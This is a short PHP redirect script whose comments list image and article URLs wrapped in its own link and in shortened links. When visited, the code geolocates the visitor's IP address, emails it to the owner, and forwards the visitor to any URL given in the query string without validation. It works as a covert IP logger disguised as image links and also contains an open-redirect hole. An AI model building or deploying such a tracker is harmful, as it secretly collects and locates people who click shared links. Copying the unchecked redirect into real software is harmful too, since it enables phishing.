<?php
//http://api.mkgalaxy.com/ipRedirect.php?url=http://i67.tinypic.com/1iczrc.jpg
//http://goo.gl/eCGKlX

//images couple
//http://api.mkgalaxy.com/ipRedirect.php?url=http://i.imgur.com/G2V7two.jpg
//https://goo.gl/O05YHk

//http://api.mkgalaxy.com/ipRedirect.php?url=http://i.imgur.com/RS6kvOn.jpg

//http://api.mkgalaxy.com/ipRedirect.php?url=http://i.imgur.com/Tlq1NN3.jpg

//http://api.mkgalaxy.com/ipRedirect.php?url=http://i.imgur.com/X3zlTYp.jpg
//http://api.mkgalaxy.com/ipRedirect.php?url=
//http://api.mkgalaxy.com/ipRedirect.php?url=
//http://api.mkgalaxy.com/ipRedirect.php?url=
//http://api.mkgalaxy.com/ipRedirect.php?url=
//http://api.mkgalaxy.com/ipRedirect.php?url=
//http://api.mkgalaxy.com/ipRedirect.php?url=
//http://api.mkgalaxy.com/ipRedirect.php?url=
//http://api.mkgalaxy.com/ipRedirect.php?url=

/*
1. https://medlineplus.gov/ency/article/000821.htm (https://goo.gl/ncvOPf)


https://goo.gl/gTjwsN
http://api.mkgalaxy.com/ipRedirect.php?url=http://www.thinktwice.com/sids.htm
*/

try {
  include('init.php');
  //pre defined variables
  $return['success'] = 1;
  $ip = !empty($_GET['ip']) ? $_GET['ip'] : $_SERVER['REMOTE_ADDR'];
  $return['data'] = iptocity($ip);
  mail('mkgxy@mkgalaxy.com', 'ip from '.$ip, var_export($return, 1));
} catch (Exception $e) {
  
}
$url = 'https://www.youtube.com';
if (!empty($_GET['url'])) {
  $url = $_GET['url'];
}
$url = urldecode($url);

header("Location: $url");//https://www.youtube.com/results?search_query=kizomba
exit;
?>